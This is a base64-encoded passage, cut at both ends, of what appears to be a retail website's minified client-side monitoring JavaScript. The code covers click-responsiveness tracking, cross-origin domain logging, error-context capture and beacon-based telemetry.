GEiID09PSBhLnR5cGUgPyBhLnRhcmdldC5wYXJlbnRFbGVtZW50IDogYS50YXJnZXQ7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFiIHx8ICFiLmhhc0F0dHJpYnV0ZXMgfHwgIWIuYXR0cmlidXRlcykgcmV0dXJuICExOwogICAgICAgICAgICAgICAgICAgIHZhciBjID0gewogICAgICAgICAgICAgICAgICAgICAgICAiY2xhc3MiOiAiZ3ctY2xvY2sgZ3ctY2xvY2stYXJpYSBzLWl0ZW0tY29udGFpbmVyLWhlaWdodC1hdXRvIGZlZWQtY2Fyb3VzZWwgdXNpbmctbW91c2Uga2ZzLWlubmVyLWNvbnRhaW5lciIuc3BsaXQoIiAiKSwKICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IFsiZGVhbENsb2NrIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkZWFsX2V4cGlyeV90aW1lciIsICJ0aW1lciJdLAogICAgICAgICAgICAgICAgICAgICAgICByb2xlOiBbInRpbWVyIl0KICAgICAgICAgICAgICAgICAgICB9LCBlID0gITE7CiAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoYykuZm9yRWFjaChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZCA9IGIuYXR0cmlidXRlc1thXSA/IGIuYXR0cmlidXRlc1thXS52YWx1ZSA6ICIiOwogICAgICAgICAgICAgICAgICAgICAgICAoY1thXSB8fCAiIikuZm9yRWFjaChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLTEgIT09IGQuaW5kZXhPZihhKSAmJiAoZSA9ICEwKQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24geShhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFhKSByZXR1cm4gITE7CiAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSAoZi5leHRyYWN0U3RyaW5nVmFsdWUoYS5ub2RlTmFtZSkgfHwgIiIpLnRvTG93ZXJDYXNlKCksCiAgICAgICAgICAgICAgICAgICAgICAgIGMgPSAoZi5leHRyYWN0U3RyaW5nVmFsdWUoYS50eXBlKSB8fCAiIikudG9Mb3dlckNhc2UoKSwKICAgICAgICAgICAgICAgICAgICAgICAgZCA9IChmLmV4dHJhY3RTdHJpbmdWYWx1ZShhLmhyZWYpIHx8ICIiKS50b0xvd2VyQ2FzZSgpOwogICAgICAgICAgICAgICAgICAgIGEgPSAoZi5leHRyYWN0U3RyaW5nVmFsdWUoYS5pZCkgfHwgIiIpLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgICAgICAgICAgICAgdmFyIGcgPSAiY2hlY2tib3ggY29sb3IgZGF0ZSBkYXRldGltZS1sb2NhbCBlbWFpbCBmaWxlIG1vbnRoIG51bWJlciBwYXNzd29yZCByYWRpbyByYW5nZSByZXNldCBzZWFyY2ggdGVsIHRleHQgdGltZSB1cmwgd2VlayIuc3BsaXQoIiAiKTsKICAgICAgICAgICAgICAgICAgICBpZiAoLTEgIT09IFsic2VsZWN0IiwgInRleHRhcmVhIiwgImh0bWwiXS5pbmRleE9mKGIpIHx8ICJpbnB1dCIgPT09IGIgJiYgLTEgIT09IGcuaW5kZXhPZihjKSB8fCAiYSIgPT09IGIgJiYgLTEgIT09IGQuaW5kZXhPZigiaHR0cCIpIHx8IC0xICE9PSBbInNpdGJyZWFkZXJyaWdodHBhZ2V0dXJuZXIiLCAic2l0YnJlYWRlcmxlZnRwYWdldHVybmVyIiwgInNpdGJyZWFkZXJwYWdlY29udGFpbmVyIl0uaW5kZXhPZihhKSkgcmV0dXJuICEwCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgICAgICBuID0gITE7CiAgICAgICAgICAgICAgICAgICAgaCA9IDA7CiAgICAgICAgICAgICAgICAgICAgYi5jbGVhclRpbWVvdXQocykKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBEKCkgewogICAgICAgICAgICAgICAgICAgIGIudWUub25TdXNoaVVubG9hZChmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHVlLmV2ZW50KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpb2xhdGlvblR5cGU6ICJ1bnJlc3BvbnNpdmUtY2xpY2tzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpb2xhdGlvbkNvdW50OiBnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxTY2FubmVkOiBrCiAgICAgICAgICAgICAgICAgICAgICAgIH0sICJjc20iLCAiY3NtLkFybW9yZWRDWEd1YXJkcmFpbHNWaW9sYXRpb24uMyIpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgYi51ZS5vbnVubG9hZChmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHVlLmNvdW50KCJhcm1vcmVkLWN4Z3VhcmRyYWlscy51bnJlc3BvbnNpdmUtY2xpY2tzLnZpb2xhdGlvbnMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIHVlLmNvdW50KCJhcm1vcmVkLWN4Z3VhcmRyYWlscy51bnJlc3BvbnNpdmUtY2xpY2tzLnZpb2xhdGlvblJhdGUiLCBnIC8gayAqIDEwMCB8fCAwKQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGIuTXV0YXRpb25PYnNlcnZlciAmJiBiLmFkZEV2ZW50TGlzdGVuZXIgJiYgT2JqZWN0LmtleXMgJiYgZCAmJiBkLnVlICYmIGQudWUubG9nICYmIGQudWVfdW5ydCAmJiBkLnVlX3V0aWxzKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIHogPSBkLnVlX3VucnQsIHIgPSAiY2VsIiwgdyA9ICJ1bnJfbWNtIiwgQyA9ICJyZXNfbWNtIiwgcCA9IGIucGVyZm9ybWFuY2UsIGYgPSBkLnVlX3V0aWxzLAogICAgICAgICAgICAgICAgICAgICAgICBuID0gITEsIGggPSAwLCBzID0gMCwgcSA9ICExLCBsID0gMCwgZyA9IDAsIGsgPSAwOwogICAgICAgICAgICAgICAgICAgIGIuYWRkRXZlbnRMaXN0ZW5lciAmJiAoYi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWRvd24iLCB4LCAhMCksIGIuYWRkRXZlbnRMaXN0ZW5lcigiYmVmb3JldW5sb2FkIiwgbSwgITApLCBiLmFkZEV2ZW50TGlzdGVuZXIoInZpc2liaWxpdHljaGFuZ2UiLCBtLCAhMCksIGIuYWRkRXZlbnRMaXN0ZW5lcigicGFnZWhpZGUiLCBtLCAhMCkpOwogICAgICAgICAgICAgICAgICAgIGIudWUgJiYgYi51ZS5ldmVudCAmJiBiLnVlLm9uU3VzaGlVbmxvYWQgJiYKICAgICAgICAgICAgICAgICAgICBiLnVlLm9udW5sb2FkICYmIEQoKTsKICAgICAgICAgICAgICAgICAgICAobmV3IE11dGF0aW9uT2JzZXJ2ZXIoQSkpLm9ic2VydmUodCwgewogICAgICAgICAgICAgICAgICAgICAgICBjaGlsZExpc3Q6ICEwLAogICAgICAgICAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzOiAhMCwKICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyRGF0YTogITAsCiAgICAgICAgICAgICAgICAgICAgICAgIHN1YnRyZWU6ICEwCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkodWVfY3NtLCB3aW5kb3csIGRvY3VtZW50KTsKCgogICAgICAgICAgICB1ZV9jc20udWUuZXhlYyhmdW5jdGlvbiAoZywgZSkgewogICAgICAgICAgICAgICAgaWYgKGUudWVfZXJyKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGYgPSAiIjsKICAgICAgICAgICAgICAgICAgICBlLnVlX2Vyci5lcnJvckhhbmRsZXJzIHx8IChlLnVlX2Vyci5lcnJvckhhbmRsZXJzID0gW10pOwogICAgICAgICAgICAgICAgICAgIGUudWVfZXJyLmVycm9ySGFuZGxlcnMucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICJmY3R4IiwgaGFuZGxlcjogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghYS5sb2dMZXZlbCB8fCAiRkFUQUwiID09PSBhLmxvZ0xldmVsKSBpZiAoZiA9IGcuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IGYuaW5kZXhPZigidmFyIHVlX3QwPXVlX3QwfHwrbmV3IERhdGUoKTsiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLTEgIT09IGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBmLnN1YnN0cigwLCBiKS5zcGxpdChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gTWF0aC5tYXgoYi5sZW5ndGggLSAxMCAtIDEsIDApLCBiID0gYi5zbGljZShkLCBiLmxlbmd0aCAtIDEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLmZjc21sbiA9IGQgKyBiLmxlbmd0aCArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEuY2luZm8gPSBhLmNpbmZvIHx8IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBjID0gMDsgYyA8IGIubGVuZ3RoOyBjKyspIGEuY2luZm9bZCArIGMgKyAxICsgIiJdID0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJbY10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYiA9IGYuc3BsaXQoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEuY2luZm8gPSBhLmNpbmZvIHx8IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghKGEuZiB8fCB2b2lkIDAgPT09IGEubCB8fCBhLmwgaW4gYS5jaW5mbykpIGZvciAoYyA9ICthLmwgLSAxLCBkID0gTWF0aC5tYXgoYyAtIDUsIDApLCBjID0gTWF0aC5taW4oYyArIDUsIGIubGVuZ3RoIC0gMSk7IGQgPD0gYzsgZCsrKSBhLmNpbmZvW2QgKyAxICsgIiJdID0gYltkXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwgImZhdGFscy1jb250ZXh0IikoZG9jdW1lbnQsIHdpbmRvdyk7CgoKICAgICAgICAgICAgKGZ1bmN0aW9uIChtLCBhKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBjKGspIHsKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBmKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYiAmJiAic3RyaW5nIiA9PT0gdHlwZW9mIGIgJiYgKGIgPSAoYiA9IGIubWF0Y2goL14oPzpodHRwcz86KT9cL1wvKC4qPykoXC98JCkvaSkpICYmIDEgPCBiLmxlbmd0aCA/IGJbMV0gOiBudWxsLCBiICYmIGIgJiYgKCJudW1iZXIiID09PSB0eXBlb2YgZVtiXSA/IGVbYl0rKyA6IGVbYl0gPSAxKSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGQoYikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IDEwLCBkID0gK25ldyBEYXRlOwogICAgICAgICAgICAgICAgICAgICAgICBiICYmIGIudGltZVJlbWFpbmluZyA/IGUgPSBiLnRpbWVSZW1haW5pbmcoKSA6IGIgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lUmVtYWluaW5nOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE1hdGgubWF4KDAsIGUgLSAoK25ldyBEYXRlIC0gZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGMgPSBhLnBlcmZvcm1hbmNlLmdldEVudHJpZXMoKSwgayA9IGU7IGcgPCBjLmxlbmd0aCAmJiBrID4gbjspIGNbZ10ubmFtZSAmJiBmKGNbZ10ubmFtZSksIGcrKywgayA9IGIudGltZVJlbWFpbmluZygpOwogICAgICAgICAgICAgICAgICAgICAgICBnID49IGMubGVuZ3RoID8gaCghMCkgOiBsKCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoYikgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIgPSBtLnNjcmlwdHM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChiKSBmb3IgKHZhciBkID0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwOyBkIDwgYi5sZW5ndGg7IGQrKykgKGMgPSBiW2RdLmdldEF0dHJpYnV0ZSgic3JjIikpICYmICJ1bmRlZmluZWQiICE9PSBjICYmIGYoYykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAwIDwgT2JqZWN0LmtleXMoZSkubGVuZ3RoICYmIChwICYmIHVlX2NzbS51ZSAmJiB1ZV9jc20udWUuZXZlbnQgJiYgdWVfY3NtLnVlLmV2ZW50KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvbWFpbnM6IGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlVHlwZTogYS51ZV9wdHkgfHwgbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YlBhZ2VUeXBlOiBhLnVlX3NwdHkgfHwgbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2VUeXBlSWQ6IGEudWVfcHRpIHx8IG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgfSwgImNzbSIsICJjc20uQ3Jvc3NPcmlnaW5Eb21haW5zLjIiKSwgYS51ZV9leHQgPSBlKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gbCgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgITAgPT09IGsgPyBkKCkgOiBhLnJlcXVlc3RJZGxlQ2FsbGJhY2sgPyBhLnJlcXVlc3RJZGxlQ2FsbGJhY2soZCkgOiBhLnJlcXVlc3RBbmltYXRpb25GcmFtZSA/IGEucmVxdWVzdEFuaW1hdGlvbkZyYW1lKGQpIDogYS5zZXRUaW1lb3V0KGQsIDEwMCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGMoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhLnBlcmZvcm1hbmNlICYmIGEucGVyZm9ybWFuY2UuZ2V0RW50cmllcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhLnBlcmZvcm1hbmNlLmdldEVudHJpZXMoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICFiIHx8IDAgPj0gYi5sZW5ndGggPyBoKCExKSA6IGwoKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaCghMSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHZhciBlID0gYS51ZV9leHQgfHwge307CiAgICAgICAgICAgICAgICAgICAgYS51ZV9leHQgfHwgYygpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcSgpIHsKICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGMsIHIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgdmFyIHMgPSBhLnVlX2RzZXJyIHx8ICExLCBwID0gITAsIG4gPSAxLCByID0gMkUzLCBnID0gMDsKICAgICAgICAgICAgICAgIGEudWVfZXJyICYmIHMgJiYgKGEudWVfZXJyLmVycm9ySGFuZGxlcnMgfHwgKGEudWVfZXJyLmVycm9ySGFuZGxlcnMgPSBbXSksIGEudWVfZXJyLmVycm9ySGFuZGxlcnMucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgbmFtZTogImV4dCIsIGhhbmRsZXI6IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghYS5sb2dMZXZlbCB8fCAiRkFUQUwiID09PSBhLmxvZ0xldmVsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZiA9IGMoITApLCBkID0gW10sIGg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGggaW4gZikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBmID0gaCwgZyA9IGYubWF0Y2goL2FtYXpvbihcLmNvbT8pP1wuXHd7MiwzfSQvaSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZyAmJiAxIDwgZy5sZW5ndGggfHwgLTEgIT09IGYuaW5kZXhPZigiYW1hem9uLWFkc3lzdGVtLmNvbSIpIHx8IC0xICE9PSBmLmluZGV4T2YoImFtYXpvbnBheS5jb20iKSB8fCAtMSAhPT0gZi5pbmRleE9mKCJjbG91ZGZyb250LWxhYnMuYW1hem9uYXdzLmNvbSIpIHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLmV4dCA9IGQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgIGEudWUgJiYgYS51ZS5pc2wgPyBjKCkgOiBhLnVlICYmIHVlLmF0dGFjaCAmJiB1ZS5hdHRhY2goImxvYWQiLCBxKQogICAgICAgICAgICB9KShkb2N1bWVudCwgd2luZG93KTsKCgogICAgICAgICAgICB1ZV9jc20udWUuZXhlYyhmdW5jdGlvbiAoYiwgZSkgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gcSgpIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBhID0gMDsgYSA8IGYubGVuZ3RoOyBhKyspIGE6Zm9yICh2YXIgZCA9IHIucmVwbGFjZShBLCBmW2FdKSArIGdbZlthXV0gKyBzLCBjID0gYXJndW1lbnRzLCBiID0gMDsgYiA8IGMubGVuZ3RoOyBiKyspIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNbYl0uc2VuZChkKTsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgYQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZyA9IHt9OwogICAgICAgICAgICAgICAgICAgIGYgPSBbXTsKICAgICAgICAgICAgICAgICAgICBtID0gMDsKICAgICAgICAgICAgICAgICAgICBrID0gbgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHQoKSB7CiAgICAgICAgICAgICAgICAgICAgcShCLCB1KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHYoYSwgbCwgYykgewogICAgICAgICAgICAgICAgICAgIHArKzsKICAgICAgICAgICAgICAgICAgICBpZiAocCA+IHcpIGQuY291bnQgJiYgMSA9PSBwIC0gdyAmJiAoZC5jb3VudCgiV2VibGFiVHJpZ2dlclRocmVzaG9sZFJlYWNoZWQiLCAxKSwgYi51ZV9pbnQgJiYgY29uc29sZS5lcnJvcigiTnVtYmVyIG9mIG1heCBjYWxsIHJlYWNoZWQuIERhdGEgd2lsbCBubyBsb25nZXIgYmUgc2VuZCIpKTsgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBoID0gYyB8fCB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgaCAmJiAtMSA8IGguY29uc3RydWN0b3IudG9TdHJpbmcoKS5pbmRleE9mKEMpICYmIGEgJiYgLTEgPCBhLmNvbnN0cnVjdG9yLnRvU3RyaW5nKCkuaW5kZXhPZih4KSAmJiBsICYmIC0xIDwgbC5jb25zdHJ1Y3Rvci50b1N0cmluZygpLmluZGV4T2YoeCkgPwogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGggPSBiLnVlX2lkLCBjICYmIGMucmlkICYmIChoID0gYy5yaWQpLCBjID0gaCwgYSA9IGVuY29kZVVSSUNvbXBvbmVudCgiLHdsPSIgKyBhICsgIi8iICsgbCksIDJFMyA+IGEubGVuZ3RoICsgbiA/ICgyRTMgPCBrICsgYS5sZW5ndGggJiYgdCgpLCB2b2lkIDAgPT09IGdbY10gJiYgKGdbY10gPSAiIiwgZi5wdXNoKGMpKSwgZ1tjXSArPSBhLCBrICs9IGEubGVuZ3RoLCBtIHx8IChtID0gZS5zZXRUaW1lb3V0KHQsIEQpKSkgOiBiLnVlX2ludCAmJiBjb25zb2xlLmVycm9yKCJJbnZhbGlkIEFQSSBjYWxsLiBUaGUgaW5wdXQgcHJvdmlkZWQgaXMgb3ZlciAyMDAwIGNoYXJzLiIpKSA6IGQuY291bnQgJiYgKGQuY291bnQoIldlYmxhYlRyaWdnZXJJbXByb3BlckFQSUNhbGwiLCAxKSwgYi51ZV9pbnQgJiYgY29uc29sZS5lcnJvcigiSW52YWxpZCBBUEkgY2FsbC4gVGhlIGlucHV0IHByb3ZpZGVkIGRvZXMgbm90IG1hdGNoIHRoZSBBUEkgcHJvdG9jb2wgaS5lIHVlLnRyaWdnZXIoU3RyaW5nLCBTdHJpbmcsIE9iamVjdCkuIikpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIEUoKSB7CiAgICAgICAgICAgICAgICAgICAgZC50cmlnZ2VyICYmIGQudHJpZ2dlci5pc1N0dWIgJiYKICAgICAgICAgICAgICAgICAgICBkLnRyaWdnZXIucmVwbGF5KGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHYuYXBwbHkodGhpcywgYSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHkoKSB7CiAgICAgICAgICAgICAgICAgICAgeiB8fCAoZi5sZW5ndGggJiYgcSh1KSwgeiA9ICEwKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIHZhciBzID0gIjoxMjM0IiwKICAgICAgICAgICAgICAgICAgICByID0gIi8vIiArIGIudWVfZnVybCArICIvMS9yZW1vdGUtd2VibGFiLXRyaWdnZXJzLzEvT0UvIiArIGIudWVfbWlkICsgIjoiICsgYi51ZV9zaWQgKyAiOlBMQ0hMRFJfUklEJHM6d2wtY2xpZW50LWlkJTNEQ1NNVHJpZ2VyIiwKICAgICAgICAgICAgICAgICAgICBBID0gIlBMQ0hMRFJfUklEIiwgRCA9IGIud3R0IHx8IDFFNCwgbiA9IHIubGVuZ3RoICsgcy5sZW5ndGgsIHcgPSBiLm13dGMgfHwgMkUzLAogICAgICAgICAgICAgICAgICAgIEYgPSBlLlhNTEh0dHBSZXF1ZXN0ICYmICJ3aXRoQ3JlZGVudGlhbHMiIGluIG5ldyBlLlhNTEh0dHBSZXF1ZXN0LCB4ID0gIlN0cmluZyIsIEMgPSAiT2JqZWN0IiwKICAgICAgICAgICAgICAgICAgICBkID0gYi51ZSwgZyA9IHt9LCBmID0gW10sIGsgPSBuLCBtLCB6ID0gITEsIHAgPSAwLCBCID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZDogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoRikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IG5ldyBlLlhNTEh0dHBSZXF1ZXN0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiLm9wZW4oIkdFVCIsIGEsICEwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYi5zZW5kKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgdGhyb3ciIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0oKSwgdSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmQ6IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKG5ldyBJbWFnZSkuc3JjID0gYQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSgpOwogICAgICAgICAgICAgICAgZS5lbmNvZGVVUklDb21wb25lbnQgJiYgKGQuYXR0YWNoICYmIChkLmF0dGFjaCgiYmVmb3JldW5sb2FkIiwgeSksIGQuYXR0YWNoKCJwYWdlaGlkZSIsIHkpKSwgRSgpLCBkLnRyaWdnZXIgPSB2KQogICAgICAgICAgICB9LCAiY2xpZW50LXdibC10cmciKSh1ZV9jc20sIHdpbmRvdyk7CgoKICAgICAgICAgICAgKGZ1bmN0aW9uIChrLCBkLCBoKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBmKGEsIGMsIGIpIHsKICAgICAgICAgICAgICAgICAgICBhICYmIGEuaW5kZXhPZiAmJiAwID09PSBhLmluZGV4T2YoImh0dHAiKSAmJiAwICE9PSBhLmluZGV4T2YoImh0dHBzIikgJiYgbChzLCBjLCBhLCBiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGcoYSwgYywgYikgewogICAgICAgICAgICAgICAgICAgIGEgJiYgYS5pbmRleE9mICYmIChsb2NhdGlvbi5ocmVmLnNwbGl0KCIjIilbMF0gIT0gYSAmJiBudWxsICE9PSBhICYmICJ1bmRlZmluZWQiICE9PSB0eXBlb2YgYSB8fCBsKHQsIGMsIGEsIGIpKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGwoYSwgYywgYiwgZSkgewogICAgICAgICAgICAgICAgICAgIG1bYl0gfHwgKGUgPSB1ICYmIGUgPyBuKGUpIDogIk4vQSIsIGQudWVMb2dFcnJvciAmJiBkLnVlTG9nRXJyb3IoewogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBhICsgYyArICIgOiAiICsgYiwKICAgICAgICAgICAgICAgICAgICAgICAgbG9nTGV2ZWw6IHYsCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YWNrOiAiTi9BIgogICAgICAgICAgICAgICAgICAgIH0sIHthdHRyaWJ1dGlvbjogZX0pLCBtW2JdID0gMSwgcCsrKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGUoYSwgYykgewogICAgICAgICAgICAgICAgICAgIGlmIChhICYmIGMpIGZvciAodmFyIGIgPSAwOyBiIDwgYS5sZW5ndGg7IGIrKykgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgYyhhW2JdKQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGQpIHsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcSgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZC5wZXJmb3JtYW5jZSAmJiBkLnBlcmZvcm1hbmNlLmdldEVudHJpZXNCeVR5cGUgPwogICAgICAgICAgICAgICAgICAgICAgICBkLnBlcmZvcm1hbmNlLmdldEVudHJpZXNCeVR5cGUoInJlc291cmNlIikgOiBbXQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG4oYSkgewogICAgICAgICAgICAgICAgICAgIGlmIChhLmlkKSByZXR1cm4gIi8vKltAaWQ9JyIgKyBhLmlkICsgIiddIjsKICAgICAgICAgICAgICAgICAgICB2YXIgYzsKICAgICAgICAgICAgICAgICAgICBjID0gMTsKICAgICAgICAgICAgICAgI